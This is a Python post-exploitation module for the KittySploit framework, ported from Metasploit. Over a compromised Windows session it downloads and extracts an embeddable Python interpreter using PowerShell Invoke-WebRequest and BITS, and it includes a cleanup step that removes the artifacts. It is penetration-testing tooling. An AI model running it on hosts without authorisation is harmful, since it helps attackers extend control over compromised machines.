#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from core.framework.failure import FailureType, ProcedureError
import os
import re
import time

class Module(Post):
    
    __info__ = {
        "name": "Install Python for Windows",
        "description": "Downloads and extracts an embeddable Python3 distribution onto the target",
        "author": "KittySploit Team (based on Metasploit module by Michael Long)",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://docs.python.org/3/using/windows.html#windows-embeddable",
            "https://attack.mitre.org/techniques/T1064/"
        ],
    }
    
    session_id = OptString("", "Session ID", True)
    python_version = OptString("3.12.1", "Python version to download (e.g., 3.12.1, 3.11.7)", True)
    python_url_base = OptString("https://www.python.org/ftp/python/", "Base URL for Python distributions", False)
    file_path = OptString("", "Path to zip (default: %%TEMP%%\\python-embed.zip). Set if using SKIP_DOWNLOAD", False)
    skip_download = OptBool(False, "Skip download; use existing zip at file_path", False)
    cleanup = OptBool(False, "Remove module artifacts", False)
    
    def _get_session_id_value(self) -> str:
        """Return the current session_id option value as a string."""
        value = ""
        try:
            value = getattr(self, 'session_id', '') or ""
        except Exception:
            value = ""
        if hasattr(value, 'value'):
            value = value.value
        return str(value or "").strip()
    
    def _get_option_value(self, option_name: str, default=None):
        """Safely get option value"""
        try:
            option = getattr(self, option_name, None)
            if option is None:
                return default
            if hasattr(option, 'value'):
                return option.value
            return option if option != "" else default
        except Exception:
            return default
    
    def _is_meterpreter_session(self) -> bool:
        """Check if the session is a meterpreter session"""
        session_id_value = self._get_session_id_value()
        if not session_id_value or not self.framework or not hasattr(self.framework, 'session_manager'):
            return False
        
        session = self.framework.session_manager.get_session(session_id_value)
        if session:
            session_type = getattr(session, 'session_type', '') or ''
            return session_type.lower() == SessionType.METERPRETER.value.lower()
        return False
    
    def _execute_cmd(self, command: str, timeout: int = 30) -> str:
        """Execute a command via the session"""
        if not command:
            return ""
        
        try:
            if self._is_meterpreter_session():
                # For meterpreter, use shell command
                if not command.startswith("shell ") and not command.startswith("execute "):
                    command = f"shell {command}"
            
            output = self.cmd_execute(command)
            return output.strip() if output else ""
        except Exception as e:
            print_warning(f"Command execution failed: {str(e)}")
            return ""
    
    def _check_powershell(self) -> bool:
        """Check if PowerShell is available"""
        print_status("Checking for PowerShell...")
        
        # Check for PowerShell
        check_cmd = 'powershell -Command "Write-Output $PSVersionTable.PSVersion"'
        result = self._execute_cmd(check_cmd, timeout=10)
        
        if result and ("Major" in result or re.search(r'\d+\.\d+', result)):
            print_success("PowerShell is available")
            return True
        else:
            # Try alternative path
            check_cmd2 = '%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command "exit"'
            result2 = self._execute_cmd(check_cmd2, timeout=5)
            if result2 is not None:  # Even empty output means it exists
                print_success("PowerShell is available")
                return True
        
        print_error("[!] PowerShell is not available")
        return False
    
    def _file_exists(self, file_path: str) -> bool:
        """Check if a file exists on the remote system"""
        check_cmd = f'if exist "{file_path}" (echo EXISTS) else (echo NOTFOUND)'
        result = self._execute_cmd(check_cmd, timeout=5)
        return "EXISTS" in result

    def _get_temp_dir(self) -> str:
        """Get %TEMP% on the target (no spaces, reliable for downloads)."""
        r = self._execute_cmd("echo %TEMP%", timeout=5)
        if r and r.strip():
            return r.strip().rstrip("\\")
        return "C:\\Windows\\Temp"

    def _resolve_absolute_path(self, file_path: str) -> str:
        """Resolve path to absolute on the target. Uses %TEMP% if file_path empty."""
        if not file_path or not file_path.strip():
            return self._get_temp_dir() + "\\python-embed.zip"
        file_path = file_path.replace("/", "\\").strip()
        if file_path.startswith(".\\"):
            file_path = file_path[2:]
        if not file_path:
            return self._get_temp_dir() + "\\python-embed.zip"
        if len(file_path) >= 2 and file_path[1] == ":":
            return file_path  # already absolute
        if file_path.startswith("%") and "%" in file_path[1:]:
            # Expand e.g. %TEMP%\foo
            expanded = self._execute_cmd(f"echo {file_path}", timeout=5)
            if expanded and expanded.strip():
                return expanded.strip().rstrip("\\")
        cwd = self._execute_cmd("cd", timeout=5)
        if not cwd or not cwd.strip():
            cwd = self._execute_cmd("echo %CD%", timeout=5)
        if not cwd or not cwd.strip():
            return file_path
        cwd = cwd.strip().rstrip("\\")
        return cwd + "\\" + file_path
    
    def _cleanup_artifacts(self) -> bool:
        """Remove module artifacts"""
        print_status("Removing module artifacts...")
        try:
            python_version = self._get_option_value('python_version', '3.12.1')
            file_path_abs = self._resolve_absolute_path(self._get_option_value('file_path', ''))
            dest_dir = file_path_abs.replace("/", "\\").rstrip("\\")
            if "\\" in dest_dir:
                dest_dir = dest_dir.rsplit("\\", 1)[0]
            else:
                dest_dir = "."
            python_folder = f"{dest_dir}\\python-{python_version}-embed-win32"
            script = (
                'Stop-Process -Name "python" -Force -ErrorAction SilentlyContinue; '
                'Stop-Process -Name "pythonw" -Force -ErrorAction SilentlyContinue; '
                f'Remove-Item -Force -ErrorAction SilentlyContinue -LiteralPath \'{file_path_abs}\'; '
                f'Remove-Item -Force -Recurse -ErrorAction SilentlyContinue -LiteralPath \'{python_folder}\'; '
            )
            self._execute_cmd('powershell -Command "' + script + '"', timeout=10)
            print_success("Cleanup completed")
            return True
        except Exception as e:
            print_error(f"Cleanup failed: {str(e)}")
            return False
    
    def _download_python(self) -> bool:
        """Download Python embeddable zip file or use existing if skip_download."""
        try:
            python_version = self._get_option_value('python_version', '3.12.1')
            python_url_base = self._get_option_value('python_url_base', 'https://www.python.org/ftp/python/')
            file_path_opt = self._get_option_value('file_path', '')
            skip = self._get_option_value('skip_download', False)
            if isinstance(skip, str):
                skip = skip.lower() in ('true', '1', 'yes')

            arch = "win32"
            python_url = f"{python_url_base}{python_version}/python-{python_version}-embed-{arch}.zip"
            file_path_abs = self._resolve_absolute_path(file_path_opt)

            if skip:
                print_status("SKIP_DOWNLOAD is set; using existing file.")
                if self._file_exists(file_path_abs):
                    print_success(f"Found existing zip: {file_path_abs}")
                    return True
                print_error(f"File not found: {file_path_abs}")
                print_status("Set file_path to the path of the zip, or run download manually (see below).")
                return False

            print_status(f"Downloading from {python_url}")
            print_status(f"Saving to: {file_path_abs}")

            # Try Invoke-WebRequest first (synchronous, works in remote shells; timeout 120s)
            print_status("Trying Invoke-WebRequest (synchronous)...")
            iwr_cmd = (
                'powershell -NoProfile -Command "'
                'try { '
                'Invoke-WebRequest -Uri \'' + python_url + '\' -OutFile \'' + file_path_abs + '\' -UseBasicParsing -TimeoutSec 120; '
                'exit 0 '
                '} catch { Write-Output (\"ERR:\" + $_.Exception.Message); exit 1 }"'
            )
            iwr_result = self._execute_cmd(iwr_cmd, timeout=130)
            if self._file_exists(file_path_abs):
                size_cmd = 'powershell -Command "(Get-Item \'' + file_path_abs + '\').Length"'
                sr = self._execute_cmd(size_cmd, timeout=5)
                if sr:
                    try:
                        file_size = int(sr.strip())
                        if file_size > 1000000:
                            print_success(f"Downloaded ({file_size / (1024*1024):.2f} MB)")
                            return True
                    except ValueError:
                        pass
            if iwr_result and "ERR:" in (iwr_result or ""):
                print_warning("Invoke-WebRequest failed: " + (iwr_result or "").strip()[:200])

            # Fallback: BITS (background; often fails in non-interactive/remote context)
            print_status("Trying background download (BITS)...")
            bits_cmd = (
                'start /B powershell -NoProfile -Command '
                '"Start-BitsTransfer -Source \'' + python_url + '\' -Destination \'' + file_path_abs + '\'"'
            )
            self._execute_cmd(bits_cmd, timeout=10)

            print_status("Waiting for download (up to 2 min)...")
            max_wait = 120
            check_interval = 3
            waited = 0
            while waited < max_wait:
                if self._file_exists(file_path_abs):
                    size1_cmd = 'powershell -Command "(Get-Item \'' + file_path_abs + '\').Length"'
                    size1 = self._execute_cmd(size1_cmd, timeout=5)
                    time.sleep(2)
                    size2_cmd = 'powershell -Command "(Get-Item \'' + file_path_abs + '\').Length"'
                    size2 = self._execute_cmd(size2_cmd, timeout=5)
                    if size1 and size2 and size1.strip() == size2.strip():
                        try:
                            file_size = int(size1.strip())
                            if file_size > 1000000:
                                print_success(f"Downloaded ({file_size / (1024*1024):.2f} MB)")
                                return True
                        except ValueError:
                            pass
                time.sleep(check_interval)
                waited += check_interval
                if waited % 15 == 0:
                    print_status(f"Still waiting... ({waited}s)")

            if self._file_exists(file_path_abs):
                size_cmd = 'powershell -Command "(Get-Item \'' + file_path_abs + '\').Length"'
                sr = self._execute_cmd(size_cmd, timeout=5)
                if sr:
                    try:
                        if int(sr.strip()) > 1000000:
                            print_success("Download completed.")
                            return True
                    except ValueError:
                        pass

            print_error("Automatic download did not complete.")
            print_status("")
            print_status("--- Manual install ---")
            print_status("On the TARGET machine, open PowerShell and run:")
            print_status("")
            print_success(
                'powershell -NoProfile -Command "'
                'Invoke-WebRequest -Uri \'' + python_url + '\' -OutFile \'' + file_path_abs + '\' -UseBasicParsing"'
            )
            print_status("")
            print_status("Or with BITS:")
            print_success(
                'powershell -NoProfile -Command "'
                'Start-BitsTransfer -Source \'' + python_url + '\' -Destination \'' + file_path_abs + '\'"'
            )
            print_status("")
            print_status("Then run this module again with:")
            print_success("  set skip_download true")
            print_success("  set file_path " + file_path_abs)
            print_success("  run")
            return False
        except Exception as e:
            print_error(f"Download failed: {str(e)}")
            import traceback
            traceback.print_exc()
            return False
    
    def _extract_python(self) -> bool:
        """Extract Python embeddable zip file (same dir as zip)."""
        try:
            file_path_opt = self._get_option_value('file_path', '')
            file_path_abs = self._resolve_absolute_path(file_path_opt)
            # Destination = directory containing the zip
            dest_dir = file_path_abs.replace("/", "\\").rstrip("\\")
            if "\\" in dest_dir:
                dest_dir = dest_dir.rsplit("\\", 1)[0]
            else:
                dest_dir = "."

            print_status(f"Extracting: {file_path_abs} -> {dest_dir}")

            # Extract then find python.exe (zip may have root folder or flat structure)
            script = (
                f'$p = \'{file_path_abs}\'; $d = \'{dest_dir}\'; '
                'try { '
                'Expand-Archive -LiteralPath $p -DestinationPath $d -Force -ErrorAction Stop; '
                '$exe = Get-ChildItem -LiteralPath $d -Recurse -Filter "python.exe" -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName; '
                'if ($exe) { Write-Output "EXE:$exe" } else { Write-Output "FAILED:python.exe not found" } '
                '} catch { Write-Output "FAILED:$($_.Exception.Message)" }'
            )
            result = self._execute_cmd('powershell -Command "' + script + '"', timeout=60)

            if result and result.strip().startswith("EXE:"):
                print_success("Python extracted successfully")
                return True
            # Fallback: zip often extracts flat (python.exe directly in dest_dir)
            for candidate in (
                f"{dest_dir}\\python.exe",
                f"{dest_dir}\\python-3.12.1-embed-win32\\python.exe",
                f"{dest_dir}\\python-3.11.7-embed-win32\\python.exe",
            ):
                if self._file_exists(candidate):
                    print_success("Python extracted successfully")
                    return True
            if result and "FAILED" in result:
                err = result.split(":", 1)[1] if ":" in result else result
                print_error(f"Extraction failed: {err.strip()}")
            else:
                print_error("Extraction may have failed - python.exe not found")
            if result:
                print_status(f"Command output: {result}")
            return False
                    
        except Exception as e:
            print_error(f"Extraction failed: {str(e)}")
            import traceback
            traceback.print_exc()
            return False
    
    def run(self):
        """Run the Python installation module"""
        try:
            session_id_value = self._get_session_id_value()
            
            if not session_id_value:
                raise ProcedureError(FailureType.ConfigurationError, "Session ID is required")
            
            print_info("")
            print_success("Starting Python Installation Module...")
            print_info("=" * 70)
            
            # Get options
            cleanup_value = self._get_option_value('cleanup', False)
            if isinstance(cleanup_value, str):
                cleanup_value = cleanup_value.lower() in ('true', '1', 'yes')
            
            # Handle cleanup
            if cleanup_value:
                return self._cleanup_artifacts()
            
            # Check PowerShell availability
            if not self._check_powershell():
                raise ProcedureError(FailureType.NotVulnerable, "PowerShell is required but not available")
            
            # Download Python
            print_info("=" * 70)
            if not self._download_python():
                raise ProcedureError(FailureType.Unknown, "Failed to download Python")
            
            file_path_abs = self._resolve_absolute_path(self._get_option_value('file_path', ''))
            if not self._file_exists(file_path_abs):
                raise ProcedureError(FailureType.NotFound, f"Python zip file not found: {file_path_abs}")
            
            # Extract Python
            print_info("=" * 70)
            if not self._extract_python():
                raise ProcedureError(FailureType.Unknown, "Failed to extract Python")
            
            # Resolve python.exe path (zip may extract flat as python.exe or into subfolder)
            dest_dir = file_path_abs.replace("/", "\\").rstrip("\\")
            if "\\" in dest_dir:
                dest_dir = dest_dir.rsplit("\\", 1)[0]
            else:
                dest_dir = "."
            find_cmd = f'powershell -Command "(Get-ChildItem -LiteralPath \'{dest_dir}\' -Recurse -Filter python.exe -ErrorAction SilentlyContinue | Select-Object -First 1).FullName"'
            python_exe_path = self._execute_cmd(find_cmd, timeout=10)
            python_exe_path = (python_exe_path or "").strip()
            if not python_exe_path or not self._file_exists(python_exe_path):
                # Fallback: zip often extracts flat (python.exe directly in dest_dir)
                flat_path = f"{dest_dir}\\python.exe"
                if self._file_exists(flat_path):
                    python_exe_path = flat_path
                else:
                    py_ver = self._get_option_value('python_version', '3.12.1')
                    nested_path = f"{dest_dir}\\python-{py_ver}-embed-win32\\python.exe"
                    if self._file_exists(nested_path):
                        python_exe_path = nested_path
                    else:
                        raise ProcedureError(FailureType.NotFound, "Python executable not found after extraction")
            
            # Display success message
            print_info("=" * 70)
            print_success("Python installation completed successfully!")
            print_info("")
            print_status("Python location:")
            print_success(f"    {python_exe_path}")
            print_info("")
            print_status("Example usage (script file avoids shell quoting issues):")
            print_success("    echo print('hello world') > script.py")
            print_success(f'    {python_exe_path} script.py')
            print_info("")
            print_warning("Avoid using python.exe interactively, as it may hang your terminal")
            print_status("Use script files instead of -c for commands with quotes")
            print_info("")
            print_status("To cleanup artifacts, run:")
            print_status("    set cleanup true")
            print_status("    run")
            
            return True
            
        except ProcedureError as e:
            raise e
        except Exception as e:
            import traceback
            traceback.print_exc()
            raise ProcedureError(FailureType.Unknown, f"Python installation error: {str(e)}")
